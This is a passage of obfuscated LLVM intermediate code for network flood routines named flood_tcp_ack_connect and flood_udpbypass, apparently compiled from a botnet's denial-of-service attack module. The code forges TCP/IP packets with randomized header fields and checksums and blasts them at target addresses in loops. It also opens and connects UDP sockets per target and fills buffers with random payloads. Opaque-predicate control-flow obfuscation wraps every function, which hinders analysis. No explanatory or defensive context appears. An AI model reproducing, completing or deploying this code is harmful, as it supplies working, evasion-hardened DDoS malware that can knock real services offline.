  %595 = call i32 @rand_new()
  %596 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %597 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %596, i32 0, i32 8
  store i32 %595, i32* %597, align 4
  br label %598

; <label>:598:                                    ; preds = %594, %589
  %599 = load i32, i32* @x.27
  %600 = load i32, i32* @y.28
  %601 = sub i32 %599, 1
  %602 = mul i32 %599, %601
  %603 = urem i32 %602, 2
  %604 = icmp eq i32 %603, 0
  %605 = icmp slt i32 %600, 10
  %606 = or i1 %604, %605
  br i1 %606, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %598
  %607 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %608 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %607, i32 0, i32 3
  %609 = load i16, i16* %608, align 4
  %610 = zext i16 %609 to i32
  %611 = icmp eq i32 %610, 65535
  %612 = load i32, i32* @x.27
  %613 = load i32, i32* @y.28
  %614 = sub i32 %612, 1
  %615 = mul i32 %612, %614
  %616 = urem i32 %615, 2
  %617 = icmp eq i32 %616, 0
  %618 = icmp slt i32 %613, 10
  %619 = or i1 %617, %618
  br i1 %619, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %611, label %620, label %626

; <label>:620:                                    ; preds = %originalBBpart228
  %621 = call i32 @rand_new()
  %622 = and i32 %621, 65535
  %623 = trunc i32 %622 to i16
  %624 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %625 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %624, i32 0, i32 3
  store i16 %623, i16* %625, align 4
  br label %626

; <label>:626:                                    ; preds = %620, %originalBBpart228
  %627 = load i32, i32* @x.27
  %628 = load i32, i32* @y.28
  %629 = sub i32 %627, 1
  %630 = mul i32 %627, %629
  %631 = urem i32 %630, 2
  %632 = icmp eq i32 %631, 0
  %633 = icmp slt i32 %628, 10
  %634 = or i1 %632, %633
  br i1 %634, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %626
  %635 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %636 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %635, i32 0, i32 0
  %637 = bitcast %union.anon* %636 to %struct.anon.0*
  %638 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %637, i32 0, i32 1
  %639 = load i16, i16* %638, align 2
  %640 = zext i16 %639 to i32
  %641 = icmp eq i32 %640, 65535
  %642 = load i32, i32* @x.27
  %643 = load i32, i32* @y.28
  %644 = sub i32 %642, 1
  %645 = mul i32 %642, %644
  %646 = urem i32 %645, 2
  %647 = icmp eq i32 %646, 0
  %648 = icmp slt i32 %643, 10
  %649 = or i1 %647, %648
  br i1 %649, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %641, label %650, label %658

; <label>:650:                                    ; preds = %originalBBpart232
  %651 = call i32 @rand_new()
  %652 = and i32 %651, 65535
  %653 = trunc i32 %652 to i16
  %654 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %655 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %654, i32 0, i32 0
  %656 = bitcast %union.anon* %655 to %struct.anon.0*
  %657 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %656, i32 0, i32 1
  store i16 %653, i16* %657, align 2
  br label %658

; <label>:658:                                    ; preds = %650, %originalBBpart232
  %659 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %660 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %659, i32 0, i32 0
  %661 = bitcast %union.anon* %660 to %struct.anon.0*
  %662 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %661, i32 0, i32 0
  %663 = load i16, i16* %662, align 4
  %664 = zext i16 %663 to i32
  %665 = icmp eq i32 %664, 65535
  br i1 %665, label %666, label %674

; <label>:666:                                    ; preds = %658
  %667 = call i32 @rand_new()
  %668 = and i32 %667, 65535
  %669 = trunc i32 %668 to i16
  %670 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %671 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %670, i32 0, i32 0
  %672 = bitcast %union.anon* %671 to %struct.anon.0*
  %673 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %672, i32 0, i32 0
  store i16 %669, i16* %673, align 4
  br label %674

; <label>:674:                                    ; preds = %666, %658
  %675 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %676 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %675, i32 0, i32 0
  %677 = bitcast %union.anon* %676 to %struct.anon.0*
  %678 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %677, i32 0, i32 2
  %679 = load i32, i32* %678, align 4
  %680 = icmp eq i32 %679, 65535
  br i1 %680, label %681, label %688

; <label>:681:                                    ; preds = %674
  %682 = call i32 @rand_new()
  %683 = and i32 %682, 65535
  %684 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %685 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %684, i32 0, i32 0
  %686 = bitcast %union.anon* %685 to %struct.anon.0*
  %687 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %686, i32 0, i32 2
  store i32 %683, i32* %687, align 4
  br label %688

; <label>:688:                                    ; preds = %681, %674
  %689 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %690 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %689, i32 0, i32 0
  %691 = bitcast %union.anon* %690 to %struct.anon.0*
  %692 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %691, i32 0, i32 3
  %693 = load i32, i32* %692, align 4
  %694 = icmp eq i32 %693, 65535
  br i1 %694, label %695, label %702

; <label>:695:                                    ; preds = %688
  %696 = call i32 @rand_new()
  %697 = and i32 %696, 65535
  %698 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %699 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %698, i32 0, i32 0
  %700 = bitcast %union.anon* %699 to %struct.anon.0*
  %701 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %700, i32 0, i32 3
  store i32 %697, i32* %701, align 4
  br label %702

; <label>:702:                                    ; preds = %695, %688
  %703 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %704 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %703, i32 0, i32 7
  store i16 0, i16* %704, align 2
  %705 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %706 = bitcast %struct.iphdr* %705 to i16*
  %707 = call zeroext i16 @ip_header_checksum(i16* %706, i32 20)
  %708 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %709 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %708, i32 0, i32 7
  store i16 %707, i16* %709, align 2
  %710 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %711 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %710, i32 0, i32 0
  %712 = bitcast %union.anon* %711 to %struct.anon.0*
  %713 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %712, i32 0, i32 6
  store i16 0, i16* %713, align 4
  %714 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %715 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %716 = bitcast %struct.tcphdr* %715 to i8*
  %717 = load i16, i16* %5, align 2
  %718 = zext i16 %717 to i64
  %719 = add i64 20, %718
  %720 = trunc i64 %719 to i16
  %721 = call zeroext i16 @htons(i16 zeroext %720) #9
  %722 = load i16, i16* %5, align 2
  %723 = zext i16 %722 to i64
  %724 = add i64 20, %723
  %725 = trunc i64 %724 to i32
  %726 = call zeroext i16 @tcp_udp_header_checksum(%struct.iphdr* %714, i8* %716, i16 zeroext %721, i32 %725)
  %727 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %728 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %727, i32 0, i32 0
  %729 = bitcast %union.anon* %728 to %struct.anon.0*
  %730 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %729, i32 0, i32 6
  store i16 %726, i16* %730, align 4
  %731 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %29, i32 0, i32 0
  store i16 2, i16* %731, align 4
  %732 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %733 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %732, i32 0, i32 0
  %734 = bitcast %union.anon* %733 to %struct.anon.0*
  %735 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %734, i32 0, i32 1
  %736 = load i16, i16* %735, align 2
  %737 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %29, i32 0, i32 1
  store i16 %736, i16* %737, align 2
  %738 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %739 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %738, i32 0, i32 9
  %740 = load i32, i32* %739, align 4
  %741 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %29, i32 0, i32 2
  %742 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %741, i32 0, i32 0
  store i32 %740, i32* %742, align 4
  %743 = load i32*, i32** %22, align 8
  %744 = load i32, i32* %3, align 4
  %745 = sext i32 %744 to i64
  %746 = getelementptr inbounds i32, i32* %743, i64 %745
  %747 = load i32, i32* %746, align 4
  %748 = load i8**, i8*** %9, align 8
  %749 = load i32, i32* %3, align 4
  %750 = sext i32 %749 to i64
  %751 = getelementptr inbounds i8*, i8** %748, i64 %750
  %752 = load i8*, i8** %751, align 8
  %753 = load i16, i16* %5, align 2
  %754 = zext i16 %753 to i64
  %755 = add i64 40, %754
  %756 = bitcast %union.__CONST_SOCKADDR_ARG* %30 to %struct.sockaddr**
  %757 = bitcast %struct.sockaddr_in* %29 to %struct.sockaddr*
  store %struct.sockaddr* %757, %struct.sockaddr** %756, align 8
  %758 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %30, i32 0, i32 0
  %759 = load %struct.sockaddr*, %struct.sockaddr** %758, align 8
  %760 = call i64 @sendto(i32 %747, i8* %752, i64 %755, i32 16384, %struct.sockaddr* %759, i32 16)
  br label %761

; <label>:761:                                    ; preds = %702
  %762 = load i32, i32* %3, align 4
  %763 = add nsw i32 %762, 1
  store i32 %763, i32* %3, align 4
  br label %526

; <label>:764:                                    ; preds = %526
  br label %525
                                                  ; No predecessors!
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %170
  call void @exit(i32 1) #10
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %187
  %766 = load %struct.arguments*, %struct.arguments** %2, align 8
  %767 = getelementptr inbounds %struct.arguments, %struct.arguments* %766, i32 0, i32 3
  %768 = load i8, i8* %767, align 1
  %769 = zext i8 %768 to i64
  %770 = call noalias i8* @calloc(i64 %769, i64 4) #8
  %771 = bitcast i8* %770 to i32*
  store i32* %771, i32** %22, align 8
  %772 = load i32*, i32** %22, align 8
  %773 = icmp ne i32* %772, null
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %213
  store i32 0, i32* %3, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %249
  %774 = load i8**, i8*** %9, align 8
  %775 = bitcast i8** %774 to i8*
  call void @free(i8* %775) #8
  call void @exit(i32 1) #10
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %280
  %776 = load i32, i32* %23, align 4
  %777 = icmp ne i32 %776, 0
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %299
  %778 = load i16, i16* %6, align 2
  %779 = load i32*, i32** %22, align 8
  %780 = load i32, i32* %3, align 4
  %781 = sext i32 %780 to i64
  %782 = getelementptr inbounds i32, i32* %779, i64 %781
  %783 = load i32, i32* %782, align 4
  %784 = load %struct.arguments*, %struct.arguments** %2, align 8
  %785 = getelementptr inbounds %struct.arguments, %struct.arguments* %784, i32 0, i32 0
  %786 = load %struct.target*, %struct.target** %785, align 8
  %787 = load i32, i32* %3, align 4
  %788 = sext i32 %787 to i64
  %789 = getelementptr inbounds %struct.target, %struct.target* %786, i64 %788
  %790 = getelementptr inbounds %struct.target, %struct.target* %789, i32 0, i32 0
  %791 = load i32, i32* %790, align 4
  %792 = load i32, i32* %19, align 4
  %793 = load i16, i16* %8, align 2
  %794 = zext i16 %793 to i32
  %795 = call i32 @tcp_handshake(i16 zeroext %778, i32 %783, i32 %791, i32 %792, i32 %794)
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %533
  %796 = load i8**, i8*** %9, align 8
  %797 = load i32, i32* %3, align 4
  %798 = sext i32 %797 to i64
  %799 = getelementptr inbounds i8*, i8** %796, i64 %798
  %800 = load i8*, i8** %799, align 8
  %801 = bitcast i8* %800 to %struct.iphdr*
  store %struct.iphdr* %801, %struct.iphdr** %27, align 8
  %802 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %803 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %802, i64 1
  %804 = bitcast %struct.iphdr* %803 to %struct.tcphdr*
  store %struct.tcphdr* %804, %struct.tcphdr** %28, align 8
  %805 = load %struct.arguments*, %struct.arguments** %2, align 8
  %806 = getelementptr inbounds %struct.arguments, %struct.arguments* %805, i32 0, i32 0
  %807 = load %struct.target*, %struct.target** %806, align 8
  %808 = load i32, i32* %3, align 4
  %809 = sext i32 %808 to i64
  %810 = getelementptr inbounds %struct.target, %struct.target* %807, i64 %809
  %811 = getelementptr inbounds %struct.target, %struct.target* %810, i32 0, i32 1
  %812 = load i16, i16* %811, align 4
  %813 = zext i16 %812 to i32
  %814 = icmp slt i32 %813, 32
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %598
  %815 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %816 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %815, i32 0, i32 3
  %817 = load i16, i16* %816, align 4
  %818 = zext i16 %817 to i32
  %819 = icmp eq i32 %818, 65535
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %626
  %820 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %821 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %820, i32 0, i32 0
  %822 = bitcast %union.anon* %821 to %struct.anon.0*
  %823 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %822, i32 0, i32 1
  %824 = load i16, i16* %823, align 2
  %825 = zext i16 %824 to i32
  %826 = icmp eq i32 %825, 65535
  br label %originalBB30
}

; Function Attrs: noinline nounwind uwtable
define void @flood_tcp_ack_connect(%struct.arguments*) #0 {
  %2 = load i32, i32* @x.29
  %3 = load i32, i32* @y.30
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca %struct.arguments*, align 8
  store %struct.arguments* %0, %struct.arguments** %10, align 8
  %11 = load i32, i32* @x.29
  %12 = load i32, i32* @y.30
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %1
  %19 = alloca %struct.arguments*, align 8
  store %struct.arguments* %0, %struct.arguments** %19, align 8
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @flood_udpbypass(%struct.arguments*) #0 {
  %2 = alloca %struct.arguments*, align 8
  %3 = alloca i16, align 2
  %4 = alloca i16, align 2
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32*, align 8
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %11 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %12 = alloca i32, align 4
  store %struct.arguments* %0, %struct.arguments** %2, align 8
  store i16 0, i16* %3, align 2
  store i16 0, i16* %4, align 2
  store i32 0, i32* %5, align 4
  %13 = load %struct.arguments*, %struct.arguments** %2, align 8
  %14 = getelementptr inbounds %struct.arguments, %struct.arguments* %13, i32 0, i32 3
  %15 = load i8, i8* %14, align 1
  %16 = zext i8 %15 to i64
  %17 = call noalias i8* @calloc(i64 %16, i64 4) #8
  %18 = bitcast i8* %17 to i32*
  store i32* %18, i32** %7, align 8
  %19 = load i32*, i32** %7, align 8
  %20 = icmp ne i32* %19, null
  br i1 %20, label %38, label %21

; <label>:21:                                     ; preds = %1
  %22 = load i32, i32* @x.31
  %23 = load i32, i32* @y.32
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %21
  call void @exit(i32 1) #10
  %30 = load i32, i32* @x.31
  %31 = load i32, i32* @y.32
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  unreachable

; <label>:38:                                     ; preds = %1
  store i32 0, i32* %5, align 4
  br label %39

; <label>:39:                                     ; preds = %originalBBpart236, %38
  %40 = load i32, i32* %5, align 4
  %41 = load %struct.arguments*, %struct.arguments** %2, align 8
  %42 = getelementptr inbounds %struct.arguments, %struct.arguments* %41, i32 0, i32 3
  %43 = load i8, i8* %42, align 1
  %44 = zext i8 %43 to i32
  %45 = icmp slt i32 %40, %44
  br i1 %45, label %46, label %214

; <label>:46:                                     ; preds = %39
  %47 = load i32, i32* @x.31
  %48 = load i32, i32* @y.32
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %46
  %55 = load %struct.arguments*, %struct.arguments** %2, align 8
  %56 = getelementptr inbounds %struct.arguments, %struct.arguments* %55, i32 0, i32 1
  %57 = load %struct.option*, %struct.option** %56, align 8
  %58 = load %struct.arguments*, %struct.arguments** %2, align 8
  %59 = getelementptr inbounds %struct.arguments, %struct.arguments* %58, i32 0, i32 2
  %60 = load i8, i8* %59, align 8
  %61 = call i32 @rand() #8
  %62 = srem i32 %61, 65482
  %63 = add nsw i32 53, %62
  %64 = trunc i32 %63 to i16
  %65 = call zeroext i16 @retrieve_opt_num(%struct.option* %57, i8 zeroext %60, i8 zeroext 1, i16 zeroext %64)
  store i16 %65, i16* %4, align 2
  %66 = call i32 @socket(i32 2, i32 2, i32 0) #8
  %67 = load i32*, i32** %7, align 8
  %68 = load i32, i32* %5, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i32, i32* %67, i64 %69
  store i32 %66, i32* %70, align 4
  %71 = load i32*, i32** %7, align 8
  %72 = load i32, i32* %5, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds i32, i32* %71, i64 %73
  %75 = load i32, i32* %74, align 4
  %76 = icmp eq i32 %75, -1
  %77 = load i32, i32* @x.31
  %78 = load i32, i32* @y.32
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart215, label %originalBB1alteredBB

originalBBpart215:                                ; preds = %originalBB1
  br i1 %76, label %85, label %86

; <label>:85:                                     ; preds = %originalBBpart215
  call void @exit(i32 1) #10
  unreachable

; <label>:86:                                     ; preds = %originalBBpart215
  %87 = load i32, i32* @x.31
  %88 = load i32, i32* @y.32
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %86
  %95 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %95, align 4
  %96 = call i32 @rand_new()
  %97 = trunc i32 %96 to i16
  %98 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %97, i16* %98, align 2
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %100 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %99, i32 0, i32 0
  store i32 0, i32* %100, align 4
  %101 = load i32*, i32** %7, align 8
  %102 = load i32, i32* %5, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds i32, i32* %101, i64 %103
  %105 = load i32, i32* %104, align 4
  %106 = bitcast %union.__CONST_SOCKADDR_ARG* %10 to %struct.sockaddr**
  %107 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  store %struct.sockaddr* %107, %struct.sockaddr** %106, align 8
  %108 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %10, i32 0, i32 0
  %109 = load %struct.sockaddr*, %struct.sockaddr** %108, align 8
  %110 = call i32 @bind(i32 %105, %struct.sockaddr* %109, i32 16) #8
  %111 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %111, align 4
  %112 = load i16, i16* %4, align 2
  %113 = call zeroext i16 @htons(i16 zeroext %112) #9
  %114 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %113, i16* %114, align 2
  %115 = load %struct.arguments*, %struct.arguments** %2, align 8
  %116 = getelementptr inbounds %struct.arguments, %struct.arguments* %115, i32 0, i32 0
  %117 = load %struct.target*, %struct.target** %116, align 8
  %118 = load i32, i32* %5, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds %struct.target, %struct.target* %117, i64 %119
  %121 = getelementptr inbounds %struct.target, %struct.target* %120, i32 0, i32 1
  %122 = load i16, i16* %121, align 4
  %123 = zext i16 %122 to i32
  %124 = icmp slt i32 %123, 32
  %125 = load i32, i32* @x.31
  %126 = load i32, i32* @y.32
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBBpart219, label %originalBB17alteredBB

originalBBpart219:                                ; preds = %originalBB17
  br i1 %124, label %133, label %156

; <label>:133:                                    ; preds = %originalBBpart219
  %134 = load %struct.arguments*, %struct.arguments** %2, align 8
  %135 = getelementptr inbounds %struct.arguments, %struct.arguments* %134, i32 0, i32 0
  %136 = load %struct.target*, %struct.target** %135, align 8
  %137 = load i32, i32* %5, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds %struct.target, %struct.target* %136, i64 %138
  %140 = getelementptr inbounds %struct.target, %struct.target* %139, i32 0, i32 0
  %141 = load i32, i32* %140, align 4
  %142 = call i32 @ntohl(i32 %141) #9
  %143 = call i32 @rand_new()
  %144 = load %struct.arguments*, %struct.arguments** %2, align 8
  %145 = getelementptr inbounds %struct.arguments, %struct.arguments* %144, i32 0, i32 0
  %146 = load %struct.target*, %struct.target** %145, align 8
  %147 = load i32, i32* %5, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds %struct.target, %struct.target* %146, i64 %148
  %150 = getelementptr inbounds %struct.target, %struct.target* %149, i32 0, i32 1
  %151 = load i16, i16* %150, align 4
  %152 = zext i16 %151 to i32
  %153 = lshr i32 %143, %152
  %154 = add i32 %142, %153
  %155 = call i32 @htonl(i32 %154) #9
  br label %165

; <label>:156:                                    ; preds = %originalBBpart219
  %157 = load %struct.arguments*, %struct.arguments** %2, align 8
  %158 = getelementptr inbounds %struct.arguments, %struct.arguments* %157, i32 0, i32 0
  %159 = load %struct.target*, %struct.target** %158, align 8
  %160 = load i32, i32* %5, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds %struct.target, %struct.target* %159, i64 %161
  %163 = getelementptr inbounds %struct.target, %struct.target* %162, i32 0, i32 0
  %164 = load i32, i32* %163, align 4
  br label %165

; <label>:165:                                    ; preds = %156, %133
  %166 = phi i32 [ %155, %133 ], [ %164, %156 ]
  %167 = load i32, i32* @x.31
  %168 = load i32, i32* @y.32
  %169 = sub i32 %167, 1
  %170 = mul i32 %167, %169
  %171 = urem i32 %170, 2
  %172 = icmp eq i32 %171, 0
  %173 = icmp slt i32 %168, 10
  %174 = or i1 %172, %173
  br i1 %174, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %165
  %175 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %176 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %175, i32 0, i32 0
  store i32 %166, i32* %176, align 4
  %177 = load i32*, i32** %7, align 8
  %178 = load i32, i32* %5, align 4
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds i32, i32* %177, i64 %179
  %181 = load i32, i32* %180, align 4
  %182 = bitcast %union.__CONST_SOCKADDR_ARG* %11 to %struct.sockaddr**
  %183 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  store %struct.sockaddr* %183, %struct.sockaddr** %182, align 8
  %184 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %11, i32 0, i32 0
  %185 = load %struct.sockaddr*, %struct.sockaddr** %184, align 8
  %186 = call i32 @connect(i32 %181, %struct.sockaddr* %185, i32 16)
  %187 = load i32, i32* @x.31
  %188 = load i32, i32* @y.32
  %189 = sub i32 %187, 1
  %190 = mul i32 %187, %189
  %191 = urem i32 %190, 2
  %192 = icmp eq i32 %191, 0
  %193 = icmp slt i32 %188, 10
  %194 = or i1 %192, %193
  br i1 %194, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br label %195

; <label>:195:                                    ; preds = %originalBBpart223
  %196 = load i32, i32* @x.31
  %197 = load i32, i32* @y.32
  %198 = sub i32 %196, 1
  %199 = mul i32 %196, %198
  %200 = urem i32 %199, 2
  %201 = icmp eq i32 %200, 0
  %202 = icmp slt i32 %197, 10
  %203 = or i1 %201, %202
  br i1 %203, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %195
  %204 = load i32, i32* %5, align 4
  %205 = add nsw i32 %204, 1
  store i32 %205, i32* %5, align 4
  %206 = load i32, i32* @x.31
  %207 = load i32, i32* @y.32
  %208 = sub i32 %206, 1
  %209 = mul i32 %206, %208
  %210 = urem i32 %209, 2
  %211 = icmp eq i32 %210, 0
  %212 = icmp slt i32 %207, 10
  %213 = or i1 %211, %212
  br i1 %213, label %originalBBpart236, label %originalBB25alteredBB

originalBBpart236:                                ; preds = %originalBB25
  br label %39

; <label>:214:                                    ; preds = %39
  store i32 0, i32* %12, align 4
  br label %215

; <label>:215:                                    ; preds = %originalBBpart244, %214
  store i32 0, i32* %5, align 4
  br label %216

; <label>:216:                                    ; preds = %273, %215
  %217 = load i32, i32* %5, align 4
  %218 = load %struct.arguments*, %struct.arguments** %2, align 8
  %219 = getelementptr inbounds %struct.arguments, %struct.arguments* %218, i32 0, i32 3
  %220 = load i8, i8* %219, align 1
  %221 = zext i8 %220 to i32
  %222 = icmp slt i32 %217, %221
  br i1 %222, label %223, label %276

; <label>:223:                                    ; preds = %216
  %224 = call i32 @rand() #8
  %225 = srem i32 %224, 436
  %226 = add nsw i32 1024, %225
  %227 = trunc i32 %226 to i16
  store i16 %227, i16* %3, align 2
  %228 = load i16, i16* %3, align 2
  %229 = zext i16 %228 to i64
  %230 = call noalias i8* @malloc(i64 %229) #8
  store i8* %230, i8** %6, align 8
  store i32 0, i32* %12, align 4
  br label %231

; <label>:231:                                    ; preds = %260, %223
  %232 = load i32, i32* @x.31
  %233 = load i32, i32* @y.32
  %234 = sub i32 %232, 1
  %235 = mul i32 %232, %234
  %236 = urem i32 %235, 2
  %237 = icmp eq i32 %236, 0
  %238 = icmp slt i32 %233, 10
  %239 = or i1 %237, %238
  br i1 %239, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %231
  %240 = load i32, i32* %12, align 4
  %241 = load i16, i16* %3, align 2
  %242 = zext i16 %241 to i32
  %243 = icmp slt i32 %240, %242
  %244 = load i32, i32* @x.31
  %245 = load i32, i32* @y.32
  %246 = sub i32 %244, 1
  %247 = mul i32 %244, %246
  %248 = urem i32 %247, 2
  %249 = icmp eq i32 %248, 0
  %250 = icmp slt i32 %245, 10
  %251 = or i1 %249, %250
  br i1 %251, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %243, label %252, label %263

; <label>:252:                                    ; preds = %originalBBpart240
  %253 = call i32 @rand() #8
  %254 = and i32 %253, 65535
